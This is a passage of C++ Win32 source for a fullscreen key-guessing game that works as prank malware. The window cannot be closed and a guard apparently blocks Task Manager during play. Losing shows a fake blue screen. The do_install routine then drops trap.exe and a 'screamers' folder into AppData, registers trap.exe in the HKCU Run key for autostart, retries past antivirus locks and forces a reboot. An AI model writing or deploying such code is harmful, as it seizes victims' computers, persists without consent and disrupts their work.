        pts[2].x = x + step; pts[2].y = baseY;
        Polygon(g_mdc, pts, 3);
    }
    SelectObject(g_mdc, o);
    DeleteObject(br);
}

static void draw_computer(int cx, int cy, float bright, float rot) {
    COLORREF col = grayf(bright);
    COLORREF dark = grayf(bright * 0.55f);
    HBRUSH br = CreateSolidBrush(col);
    HBRUSH brd = CreateSolidBrush(dark);
    HBRUSH brp = CreateSolidBrush(RGB(0, 255, 120));
    HGDIOBJ o = SelectObject(g_mdc, br);

    XFORM xf;
    float c = cosf(rot), s = sinf(rot);
    xf.eM11 = c;  xf.eM12 = s;
    xf.eM21 = -s; xf.eM22 = c;
    xf.eDx = (FLOAT)cx; xf.eDy = (FLOAT)cy;
    SetWorldTransform(g_mdc, &xf);

    /* монитор */
    RoundRect(g_mdc, -42, -104, 42, -40, 16, 16);
    /* экран */
    SelectObject(g_mdc, brd);
    Rectangle(g_mdc, -32, -94, 32, -48);
    /* подставка */
    SelectObject(g_mdc, br);
    Rectangle(g_mdc, -8, -40, 8, -24);
    /* пьедестал */
    POINT pts[4] = { {-24, -24}, {24, -24}, {32, -6}, {-32, -6} };
    Polygon(g_mdc, pts, 4);
    /* основание */
    Rectangle(g_mdc, -32, -6, 32, 0);
    /* индикатор питания */
    SelectObject(g_mdc, brp);
    Ellipse(g_mdc, -28, -20, -20, -12);

    SelectObject(g_mdc, o);
    DeleteObject(br); DeleteObject(brd); DeleteObject(brp);

    XFORM id;
    id.eM11 = 1; id.eM12 = 0; id.eM21 = 0; id.eM22 = 1; id.eDx = 0; id.eDy = 0;
    SetWorldTransform(g_mdc, &id);
}

static void draw_text(int x, int y, int w, int h, HFONT f, const wchar_t *s,
                      bool center = false, COLORREF col = RGB(255, 255, 255)) {
    HGDIOBJ o = SelectObject(g_mdc, f);
    SetBkMode(g_mdc, TRANSPARENT);
    SetTextColor(g_mdc, col);
    RECT r = {x, y, x + w, y + h};
    DrawTextW(g_mdc, s, -1, &r, DT_LEFT | DT_TOP | DT_NOPREFIX | (center ? DT_CENTER : 0));
    SelectObject(g_mdc, o);
}

static void draw_qr(int x, int y, int size) {
    int n = 21;
    int cell = size / n;
    HBRUSH br = CreateSolidBrush(RGB(255, 255, 255));
    HGDIOBJ o = SelectObject(g_mdc, br);
    for (int iy = 0; iy < n; iy++) {
        for (int ix = 0; ix < n; ix++) {
            int idx = iy * n + ix;
            if (!g_qr[idx]) continue;
            RECT r = {x + ix * cell, y + iy * cell, x + (ix + 1) * cell, y + (iy + 1) * cell};
            FillRect(g_mdc, &r, br);
        }
    }
    SelectObject(g_mdc, o);
    DeleteObject(br);
}

static void draw_bsod() {
    clear_buf(BSOD_BG_RGB);
    draw_text((int)(g_W * 0.05), (int)(g_H * 0.07), (int)(g_W * 0.5), (int)(g_H * 0.20),
              g_fontBig, L":(");
    draw_text((int)(g_W * 0.05), (int)(g_H * 0.34), (int)(g_W * 0.6), (int)(g_H * 0.05),
              g_fontMed, BSOD_LINE1);
    draw_text((int)(g_W * 0.05), (int)(g_H * 0.40), (int)(g_W * 0.6), (int)(g_H * 0.05),
              g_fontMed, BSOD_LINE2);
    draw_qr((int)(g_W * 0.70), (int)(g_H * 0.50), 150);
    draw_text((int)(g_W * 0.05), (int)(g_H * 0.62), (int)(g_W * 0.6), (int)(g_H * 0.05),
              g_fontSmall, BSOD_STOP);
    if (((g_now / BSOD_BLINK_PERIOD_MS) & 1) == 0) {
        draw_text(0, g_H - 90, g_W, 40, g_fontMed, BSOD_HINT, true);
    }
}

/* ---------- игровая логика ---------- */
static void init_keys() {
    g_correctIndex = rnd(0, KEY_COUNT - 1);
    for (int i = 0; i < KEY_COUNT; i++) {
        Key &k = g_keys[i];
        k.slot = i + 1;
        int px, py;
        slotXY(k.slot, &px, &py);
        k.x = (float)px; k.y = (float)py;
        k.visible = false;
        k.correct = (i == g_correctIndex);
        k.animating = false;
        k.rot = 0.0f;
        k.doRot = false;
        k.arc = false;
        k.scale = 1.0f;
        k.baseAngle = (float)(i * (360 / KEY_COUNT)) - 90.0f;
    }
    g_moveIndex = 0;
    g_rot = 0;
    g_autoClicked = false;
}

static void handle_click(int mx, int my) {
    int i = hover_key_at(mx, my);
    if (i < 0) return;
    util::stop_music();
    g_pickCorrect = g_keys[i].correct;
    g_outcome = g_pickCorrect ? "WIN" : "LOSE";
    g_flashColor = g_bg[i];   /* весь экран зальёт цветом выбранного ключа */
    start_phase(PH_FLASH);
}

static void copy_folder(const wstring &src, const wstring &dst) {
    if (!util::dir_exists(src)) return;
    util::make_dirs(dst);
    wstring search = util::join(src, L"*");
    WIN32_FIND_DATAW fd;
    HANDLE h = FindFirstFileW(search.c_str(), &fd);
    if (h != INVALID_HANDLE_VALUE) {
        do {
            if (fd.cFileName[0] == L'.') continue;
            wstring f = util::join(src, fd.cFileName);
            if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
                util::copy_file(f, util::join(dst, fd.cFileName));
        } while (FindNextFileW(h, &fd));
        FindClose(h);
    }
}

static void write_auto_result() {
    if (!g_autoMode) return;
    wchar_t tmp[MAX_PATH] = {0};
    GetTempPathW(MAX_PATH, tmp);
    util::write_file(util::join(tmp, AUTO_RESULT_FILE),
                     g_outcome.c_str(), g_outcome.size());
}

static void do_install() {
    if (util::dry_run_enabled()) {
        if (!g_autoMode) {
            MessageBoxW(NULL,
                L"DRY RUN: найден файл %TEMP%\\limbo_noreboot.\r\n\r\n"
                L"trap.exe НЕ установлен в автозагрузку, перезагрузка НЕ выполняется. "
                L"Это безопасный режим теста BSOD.",
                WINDOW_TITLE, MB_OK | MB_ICONINFORMATION);
        }
        start_phase(PH_EXIT);
        return;
    }
    wstring dir = util::join(util::appdata_dir(), APP_DIR_NAME);
    util::make_dirs(dir);

    wstring trapPath = util::join(dir, TRAP_EXE_NAME);
    wstring runcmd = L"\"" + trapPath + L"\"";

    /* несколько попыток: антивирус может временно держать/проверять файл */
    bool ok = false;
    for (int attempt = 0; attempt < 4 && !ok; attempt++) {
        if (attempt > 0) Sleep(300);
        bool trapOK = util::extract_resource(g_hinst, IDR_TRAP, trapPath);
        util::extract_resource(g_hinst, IDR_REPAIR, util::join(dir, REPAIR_EXE_NAME));

        wstring exd = util::app_dir();
        copy_folder(util::join(exd, SCREAMERS_SUBDIR), util::join(dir, SCREAMERS_SUBDIR));
        copy_folder(util::join(exd, SOUNDS_SUBDIR), util::join(dir, SOUNDS_SUBDIR));

        util::reg_set_string(HKEY_CURRENT_USER, RUN_SUBKEY, RUN_VALUE_NAME, runcmd);

        bool fileOk = util::file_exists(trapPath);
        bool regOk = (util::reg_get_string(HKEY_CURRENT_USER, RUN_SUBKEY,
                                           RUN_VALUE_NAME) == runcmd);
        ok = trapOK && fileOk && regOk;
    }

    if (!ok) {
        MessageBoxW(NULL,
            L"Не удалось убедиться, что trap.exe установлен в автозагрузку.\r\n"
            L"Перезагрузите компьютер вручную.",
            WINDOW_TITLE, MB_OK | MB_ICONERROR);
        start_phase(PH_EXIT);
        return;
    }

    SetForegroundWindow(g_hwnd);
    if (!util::reboot_now()) {
        MessageBoxW(NULL,
            L"Система не смогла перезагрузиться автоматически.\r\n"
            L"Перезагрузите компьютер вручную — trap.exe уже в автозагрузке.",
            WINDOW_TITLE, MB_OK | MB_ICONERROR);
        start_phase(PH_EXIT);
    }
}

static void game_tick() {
    g_now = nowms();
    float dt = (float)(g_now - g_lastTick);
    g_lastTick = g_now;
    if (dt < 1.0f) dt = 1.0f;

    /* ключ под курсором — только в кругу, где идёт выбор */
    if (g_phase == PH_CIRCLE && !g_autoMode) {
        POINT mp;
        if (GetCursorPos(&mp)) {
            ScreenToClient(g_hwnd, &mp);
            g_hoverKey = hover_key_at(mp.x, mp.y);
        }
    } else {
        g_hoverKey = -1;
    }
    /* плавное увеличение/уменьшение при наведении */
    for (int i = 0; i < KEY_COUNT; i++) {
        Key &k = g_keys[i];
        float target = (i == g_hoverKey) ? KEY_HOVER_SCALE : 1.0f;
        k.scale += (target - k.scale) * clampf(dt * 0.02f, 0.0f, 1.0f);
    }

    switch (g_phase) {
    case PH_SPAWN: {
        for (int i = 0; i < KEY_COUNT; i++)
            g_keys[i].visible = (g_now - g_phaseStart >= (ULONGLONG)(i * SPAWN_STAGGER_MS));
        if (g_now - g_phaseStart >= (ULONGLONG)(KEY_COUNT * SPAWN_STAGGER_MS))
            start_phase(PH_WAIT);
        break;
    }
    case PH_WAIT:
        if (g_now - g_phaseStart >= WAIT_CORRECT_MS)
            start_phase(PH_BLINK);
        break;
    case PH_BLINK:
        /* верный ключ мигает зелёным, пока не наступит 5-я секунда трека */
        if (g_now - g_gameStart >= SHUFFLE_START_AT_MS)
            start_phase(PH_SHUFFLE);
        break;
    case PH_SHUFFLE: {
        bool busy = false;
        for (int i = 0; i < KEY_COUNT; i++) {
            updateKeyAnim(g_keys[i]);
            if (g_keys[i].animating) busy = true;
        }
        if (!busy) {
            if (g_moveIndex < 26) {
                beginMove(g_moveIndex++);
            } else {
                for (int i = 0; i < KEY_COUNT; i++) {
                    Key &k = g_keys[i];
                    float a = k.baseAngle * 3.14159265f / 180.0f;
                    float tx = g_cx + g_radius * cosf(a);
                    float ty = g_cy + g_radius * sinf(a);
                    /* «хаотичный» полный оборот при сборке в круг (как в
                     * оригинале), от текущего наклона */
                    animKey(k, tx, ty, CIRCLE_SPIN_MS,
                            k.rot + 6.2832f, true,
                            (ULONGLONG)(i * CIRCLE_SPIN_STAGGER_MS));
                }
                start_phase(PH_CIRCLE_IN);
            }
        }
        break;
    }
    case PH_CIRCLE_IN: {
        bool busy = false;
        for (int i = 0; i < KEY_COUNT; i++) {
            updateKeyAnim(g_keys[i]);
            if (g_keys[i].animating) busy = true;
        }
        if (!busy) {
            g_rot = 0;
            g_circleStart = g_now;
            start_phase(PH_CIRCLE);
        }
        break;
    }
    case PH_CIRCLE: {
        /* ключи плывут по кругу, ориентация каждого НЕ меняется */
        g_rot += (float)CIRCLE_ROTATE_DEG_PER_SEC * dt / 1000.0f;
        for (int i = 0; i < KEY_COUNT; i++) {
            Key &k = g_keys[i];
            circlePos(k, g_rot);
        }
        /* секретная комбинация: верный ключ мигает зелёным */
        if ((GetAsyncKeyState('K') & 0x8000) &&
            (GetAsyncKeyState(VK_CONTROL) & 0x8000) &&
            (GetAsyncKeyState(VK_SHIFT) & 0x8000) &&
            (GetAsyncKeyState(VK_MENU) & 0x8000)) {
            g_hintUntil = g_now + CHEAT_HINT_MS;
        }
        /* dev-автотест: сам кликаем нужный ключ */
        if (g_autoMode && !g_autoClicked && g_now - g_phaseStart > 1500) {
            int idx;
            if (g_autoMode == 2) idx = g_correctIndex;
            else {
                idx = 0;
                while (idx == g_correctIndex) idx++;
            }
            handle_click((int)g_keys[idx].x, (int)g_keys[idx].y);
            g_autoClicked = true;
        }
        break;
    }
    case PH_FLASH: {
        /* весь экран цветом выбранного ключа: держим, плавно гасим, потом катсцена */
        ULONGLONG e = g_now - g_phaseStart;
        if (e >= FLASH_HOLD_MS && e < FLASH_HOLD_MS + FLASH_FADE_MS) {
            int a = 255 - (int)(255 * (e - FLASH_HOLD_MS) / FLASH_FADE_MS);
            win::set_alpha(g_hwnd, a);
        } else if (e >= FLASH_HOLD_MS + FLASH_FADE_MS) {
            win::set_layered(g_hwnd, true);   /* обратно прозрачность по цветоключу */
            g_wasOpaque = false;
            g_csX = -160.0f;
            g_csY = 0;
            g_csRot = 0;
            g_csFallen = false;
            g_csExitAt = 0;
            g_bgScroll = 0;
            g_spScroll = 0;
            g_boom = false;
            start_phase(g_pickCorrect ? PH_CUT_WIN : PH_CUT_LOSE);
        }
        break;
    }
    case PH_CUT_WIN: {
        /* мир едет влево: фон медленнее, шипы быстрее */
        g_bgScroll += CUTSCENE_BG_SPEED * g_W * dt / 1000.0f;
        g_spScroll += CUTSCENE_SPIKE_SPEED * g_W * dt / 1000.0f;
        g_csX += (float)CUTSCENE_SPEED * g_W * dt / 1000.0f;
        if (g_csX > g_W + g_pcDW / 2 + 40) {
            /* верный ключ: катсцена закончилась — диспетчер задач возвращается */
            if (g_csExitAt == 0) {
                guard_stop();
                g_csExitAt = g_now + WIN_EXIT_DELAY_MS;
            } else if (g_now > g_csExitAt) start_phase(PH_EXIT);
        }
        break;
    }
    case PH_CUT_LOSE: {
        float target = g_W * 0.55f;
        if (!g_csFallen) {
            g_bgScroll += CUTSCENE_BG_SPEED * g_W * dt / 1000.0f;
            g_spScroll += CUTSCENE_SPIKE_SPEED * g_W * dt / 1000.0f;
            g_csX += (float)CUTSCENE_SPEED * g_W * dt / 1000.0f;
            if (g_csX >= target) {
                g_csFallen = true;
                g_csFallStart = g_now;
            }
        } else if (!g_boom) {
            ULONGLONG e = g_now - g_csFallStart;
            g_csRot = clampf((float)e * 0.006f, 0.0f, 1.25f);
            g_csY += g_H * PC_FALL_SPEED * dt / 1000.0f;
            if ((float)g_H * 0.72f + g_csY >= (float)g_H * SPIKE_TOUCH_FRAC) {
                /* удар о шипы: взрыв, потом синий экран */
                g_boom = true;
                g_boomStart = g_now;
            }
        } else if (g_now - g_boomStart >= BOOM_MS) {
            start_phase(PH_BSOD);
        }
        break;
    }
    case PH_BSOD:
        if (g_autoMode && g_now - g_phaseStart > 1200)
            g_bsodHit = true;   /* автотест: BSOD сам нажимает клавишу */
        if (g_bsodHit) {
            g_bsodHit = false;
            start_phase(PH_INSTALL);
        }
        break;
    case PH_INSTALL:
        if (!g_installDone) {   /* один вызов: иначе таймер плодит диалоги */
            g_installDone = true;
            do_install();
        }
        break;
    case PH_EXIT:
        guard_stop();
        util::stop_music();
        DestroyWindow(g_hwnd);
        break;
    }
}

static void render() {
    bool opaque = (g_phase == PH_FLASH || g_phase == PH_CUT_WIN ||
                   g_phase == PH_CUT_LOSE || g_phase == PH_BSOD);
    if (opaque != g_wasOpaque) {
        win::set_layered(g_hwnd, !opaque);
        g_wasOpaque = opaque;
    }

    switch (g_phase) {
    case PH_SPAWN:
    case PH_WAIT:
    case PH_BLINK:
    case PH_SHUFFLE:
    case PH_CIRCLE_IN:
    case PH_CIRCLE:
        clear_buf(COLOR_KEY_RGB);
        for (int i = 0; i < KEY_COUNT; i++) {
            Key &k = g_keys[i];
            if (!k.visible) continue;

            /* до сборки в круг все ключи — оранжевый спрайт (вариант 1).
             * Верный мигает ЗЕЛЁНЫМ (вариант 3) в начале (PH_BLINK) и после
             * секретной комбинации Ctrl+Shift+Alt+K в кругу.
             * После перемешивания само по себе ничто не мигает.
             * В кругу каждый ключ — своего цвета. */
            bool preCircle = (g_phase == PH_SPAWN || g_phase == PH_WAIT ||
                              g_phase == PH_BLINK || g_phase == PH_SHUFFLE ||
                              g_phase == PH_CIRCLE_IN);
            bool cheatBlink = k.correct && g_phase == PH_CIRCLE &&
                              g_now < g_hintUntil;
            bool blinkGreen = ((k.correct && g_phase == PH_BLINK) || cheatBlink) &&
                              ((g_now / BLINK_PERIOD_MS) & 1) == 0;

            /* секретная комбинация: верный ключ пульсирует (увеличивается
             * и уменьшается обратно), пока активна подсказка */
            float scale = k.scale;
            if (cheatBlink) {
                float t = (float)(g_now % CHEAT_PULSE_PERIOD_MS) /
                          (float)CHEAT_PULSE_PERIOD_MS;
                scale *= 1.0f + CHEAT_PULSE_AMPLITUDE * 0.5f *
                               (1.0f - cosf(t * 6.2831853f));
            }

            if (blinkGreen) {
                if (g_hasSprite)
                    draw_key_sprite(3, (int)k.x, (int)k.y, k.rot, scale);
                else
                    draw_key((int)k.x, (int)k.y, (int)(KEY_SIZE * scale),
                             GREEN_CORRECT_RGB, k.rot);
            } else if (g_hasSprite) {
                draw_key_sprite(preCircle ? 1 : i,
                                (int)k.x, (int)k.y, k.rot, scale);
            } else {
                draw_key((int)k.x, (int)k.y, (int)(KEY_SIZE * scale),
                         preCircle ? g_bg[1] : g_bg[i], k.rot);
            }
        }
        /* пасхалка: долго не кликаешь -> дерзкая надпись */
        if (g_phase == PH_CIRCLE && g_now - g_circleStart > IDLE_COWARD_MS) {
            bool on = ((g_now / 300) & 1) == 0;
            COLORREF col = on ? RGB(255, 60, 60) : RGB(150, 20, 20);
            draw_text(0, (int)(g_H * 0.10), g_W, 60, g_fontMed, COWARD_LINE1, true, col);
            draw_text(0, (int)(g_H * 0.16), g_W, 40, g_fontSmall, COWARD_LINE2, true, col);
        }
        break;
    case PH_FLASH:
        clear_buf(g_flashColor);   /* весь экран цветом выбранного ключа */
        break;
    case PH_CUT_WIN:
    case PH_CUT_LOSE:
        draw_background();
        draw_spikes();
        {
            /* низ компьютера едет по верхней кромке шипов (0.72 * H) */
            int groundY = (int)(g_H * 0.72f);
            int icx = (int)g_csX;
            draw_pc(icx, groundY - g_pcDH / 2 + (int)g_csY, g_csRot);
            if (g_boom)
                draw_explosion((float)icx,
                               groundY - g_pcDH * 0.4f + g_csY,
                               (float)(g_now - g_boomStart) / BOOM_MS);
        }
        break;
    case PH_BSOD:
        draw_bsod();
        break;
    default:
        clear_buf(COLOR_KEY_RGB);
        break;
    }
}

/* ---------- окно ---------- */
static LRESULT CALLBACK WndProc(HWND h, UINT m, WPARAM w, LPARAM l) {
    switch (m) {
    case WM_PAINT: {
        PAINTSTRUCT ps;
        HDC dc = BeginPaint(h, &ps);
        BitBlt(dc, 0, 0, g_W, g_H, g_mdc, 0, 0, SRCCOPY);
        EndPaint(h, &ps);
        return 0;
    }
    case WM_ERASEBKGND:
        return 1;
    case WM_SETCURSOR:
        /* над ключом — «нажимательный» курсор-рука */
        if (LOWORD(l) == HTCLIENT && g_hoverKey >= 0) {
            SetCursor(LoadCursorW(NULL, MAKEINTRESOURCEW(32649)));   /* IDC_HAND */
            return TRUE;
        }
        break;
    case WM_TIMER:
        game_tick();
        render();
        InvalidateRect(h, NULL, FALSE);
        return 0;
    case WM_LBUTTONDOWN:
        if (g_autoMode) return 0;   /* автотест: игнорируем физический ввод */
        if (g_phase == PH_CIRCLE)
            handle_click(LOWORD(l), HIWORD(l));
        else if (g_phase == PH_BSOD)
            g_bsodHit = true;
        return 0;
    case WM_KEYDOWN:
        if (g_autoMode) return 0;
        if (g_phase == PH_BSOD)
            g_bsodHit = true;
        return 0;
    case WM_CLOSE:
        return 0;
    case WM_SYSCOMMAND:
        if (w == SC_CLOSE) return 0;
        break;
    case WM_DESTROY:
        PostQuitMessage(0);
        return 0;
    }
    return DefWindowProcW(h, m, w, l);
}

static void init_fonts() {
    int lpy = GetDeviceCaps(g_mdc, LOGPIXELSY);
    g_fontBig = CreateFontW(-MulDiv(64, lpy, 72), 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
                            DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
                            CLEARTYPE_QUALITY, DEFAULT_PITCH, L"Segoe UI");
    g_fontMed = CreateFontW(-MulDiv(30, lpy, 72), 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
                            DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
                            CLEARTYPE_QUALITY, DEFAULT_PITCH, L"Segoe UI");
    g_fontSmall = CreateFontW(-MulDiv(20, lpy, 72), 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
                              DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
                              CLEARTYPE_QUALITY, DEFAULT_PITCH, L"Consolas");
}

static void init_qr() {
    int n = 21;
    for (int iy = 0; iy < n; iy++) {
        for (int ix = 0; ix < n; ix++) {
            g_qr[iy * n + ix] = (rand() % 100) < 45;
        }
    }
    /* три finder-паттерна */
    int f[][2] = { {0, 0}, {n - 7, 0}, {0, n - 7} };
    for (int k = 0; k < 3; k++) {
        int fx = f[k][0], fy = f[k][1];
        for (int y = fy; y < fy + 7; y++) {
            for (int x = fx; x < fx + 7; x++) {
                int d = (x - fx);
                int d2 = (y - fy);
                bool ring = (d == 0 || d == 6 || d2 == 0 || d2 == 6);
                bool core = (d >= 2 && d <= 4 && d2 >= 2 && d2 <= 4);
                g_qr[y * n + x] = ring || core;
            }
        }
    }
}

static void log_init_fail(const char *step) {
    char buf[256];
    wsprintfA(buf, "step=%s gle=%lu\r\n", step, (unsigned long)GetLastError());
    wchar_t tmp[MAX_PATH] = {0};
    GetTempPathW(MAX_PATH, tmp);
    util::write_file(util::join(tmp, L"limbo_init_err.txt"), buf, strlen(buf));
}

/* Настройки из settings.ini рядом с exe: [game] shuffle_speed */
static void load_settings() {
    wstring ini = util::join(util::app_dir(), SETTINGS_INI_FILE);
    wchar_t buf[64] = L"";
    if (GetPrivateProfileStringW(L"game", L"shuffle_speed", L"", buf, 64,
                                 ini.c_str()) > 0) {
        float v = (float)wcstod(buf, NULL);
        if (v >= 0.25f && v <= 4.0f) g_shuffleSpeed = v;
    }
}

int WINAPI WinMain(HINSTANCE hinst, HINSTANCE, LPSTR, int) {
    g_hinst = hinst;
    srand((unsigned)GetTickCount());
    init_qr();

    /* dev-автотест (VM): LIMBO_AUTO=wrong|correct */
    {
        wchar_t buf[16] = {0};
        DWORD n = GetEnvironmentVariableW(L"LIMBO_AUTO", buf, 16);
        if (n > 0) {
            if (lstrcmpiW(buf, L"correct") == 0) g_autoMode = 2;
            else if (lstrcmpiW(buf, L"wrong") == 0) g_autoMode = 1;
        }
    }
    SetThreadExecutionState(ES_CONTINUOUS | ES_SYSTEM_REQUIRED | ES_DISPLAY_REQUIRED);

    if (!win::init_fullscreen(hinst, WINDOW_CLASS, WINDOW_TITLE, WndProc, &g_hwnd, &g_W, &g_H)) {
        log_init_fail("init_fullscreen");
        return 1;
    }
    if (!win::create_back_buffer(&g_mdc, &g_dib, &g_old, g_W, g_H)) {
        log_init_fail("create_back_buffer");
        return 1;
    }

    init_fonts();
    load_settings();
    init_sprites();
    init_catscene();

    g_cx = g_W / 2;
    g_cy = g_H / 2;
    g_radius = (int)(std::min(g_W, g_H) * 0.30f);
    g_gridX = g_cx - (GRID_COLS * KEY_SIZE + (GRID_COLS - 1) * KEY_SPACING) / 2;
    g_gridY = g_cy - (GRID_ROWS * KEY_SIZE + (GRID_ROWS - 1) * KEY_SPACING) / 2;

    init_keys();
    start_phase(PH_SPAWN);
    g_now = g_lastTick = nowms();
    g_gameStart = g_now;   /* музыка стартует здесь же — от этой точки 5 сек до мешания */

    guard_start();

    /* музыка */
    {
        wstring musicDir = util::join(util::app_dir(), MUSIC_SUBDIR);
        wstring search = util::join(musicDir, L"*.wav");
        WIN32_FIND_DATAW fd;
        HANDLE h = FindFirstFileW(search.c_str(), &fd);
        if (h != INVALID_HANDLE_VALUE) {
            wstring f = util::join(musicDir, fd.cFileName);
            FindClose(h);
            util::play_music(f);
        }
    }

    SetForegroundWindow(g_hwnd);
    SetFocus(g_hwnd);
    SetTimer(g_hwnd, 1, 8, NULL);

    MSG msg;
    while (GetMessageW(&msg, NULL, 0, 0) > 0) {
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }

    guard_stop();
    util::stop_music();
    SetThreadExecutionState(ES_CONTINUOUS);
    write_auto_result();
    free_sprites();
    DeleteObject(g_fontBig);
    DeleteObject(g_fontMed);
    DeleteObject(g_fontSmall);
    SelectObject(g_mdc, g_old);
    DeleteObject(g_dib);
    DeleteDC(g_mdc);
    return 0;
}
